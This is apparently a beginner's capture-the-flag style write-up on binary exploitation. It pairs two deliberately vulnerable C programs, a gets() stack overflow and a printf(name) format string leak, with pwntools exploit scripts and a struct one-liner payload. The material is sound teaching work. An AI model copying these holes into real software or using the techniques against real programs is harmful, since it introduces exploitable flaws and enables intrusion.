### Easy Category :> Binary Exploitation
- This category contains simple programs i have written to demonstrate basic techniques in binary explotation .
- It covers the main topics but with most security features turned off.  Enjoy :D

#### bof
- This are the files <a href="./bof">here</a>
``` 
#include <stdio.h>

int main() {
    int check = 0;
    char input[40];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    puts("Welcome to udsm-coict! ");
    gets(input);

    if (check == 0xdeadbeed) {
        puts("Congrats, here's a flag!\n");
        system("/bin/cat flag.txt\n");
    }
}
```
- We are expected to overflow the variable input to a point where we overright the variable check with the right characters to pass the if condition .
```
#!/usr/bin/python3
from pwn import *

class con:
        def local():
                elf = ELF("./pwn")
                p = elf.process()
                return p
        def remote():
                p = remote("ip_addr", "port")
                return p
def exploit():
        p = con.local()
        print(p.recvline())
        offset = 40
        addr = p32(0xdeadbeed)
        payload = b"A"*offset + addr 
        p.sendline(payload)
        print(p.recvall())
if __name__ == "__main__":
        exploit()
```
- First i find the offset where our input starts to overright the variable check . i get its 40 then what follows is the word i want to overflow...Taking into account the little endiannes concept.
``` We can also do this with the struct module of python..
this would result to this following exploit :
python3 -c"import struct;print(b'A'*40 + struct.pack('<I',0xdeadbeed))" > exploit1
cat exploit1 | ./pwn
wiiiih :)
```
#### format string
- This are the files <a href="./string_format">here</a>
```
➜  string_format git:(master) ✗ cat pwn.c
#include <stdio.h>

void buffer_init() {
        setbuf(stdout, NULL);
        setbuf(stdin, NULL);
        setbuf(stderr, NULL);
}

int main() {
        char name[32];
        char flag[64];
        char *flag_ptr = flag;

        buffer_init();
        FILE *file = fopen("./flag.txt", "r");
        if (file == NULL) {
                printf("Please, create 'flag.txt' for debugging.\n");
                exit(0);
        }

        fgets(flag,sizeof(flag),file);

        while(1) {
                printf("What is your name?\n");
                fgets(name,sizeof(name),stdin);
                printf("\nHello there, ");
                printf(name);
                printf("\n");
        }
        return 0;
}
```
The bug is at the printf function where the function is not given a format in which it should print the contents of name variable.To mean a format specifier is not provided xD.
```
#!/usr/bin/python3

from pwn import *

class conn:
        def local():
                elf = ELF("./pwn")
                p = elf.process()
                return p
        def remote():
                p = remote("ip_addr",port)
                return p

def exploit():
        p = conn.local()
        print(p.recvline())
        payload = b"%p"*16
        p.sendline(payload)
        flag = str(p.recvuntil(b"What is")).replace("(nil)",'')
        flag = flag.replace("\\n",'')
        flag = flag.replace("'",'')
        flag = flag.replace("What is",'')
        print(flag)
        print("Wiiihiiiiihihihih :)")
        decoded_flag = []
        for element in flag.split("0x")[1:]:
            decoded_flag.append(str(p32(int("0x" + element,16))))
        decoded_flag = ''.join(decoded_flag)
        print(decoded_flag.replace("'b'",''))
        p.close()

if __name__ == "__main__":
        exploit()
```
Happy hacking :D
wiiih  :)
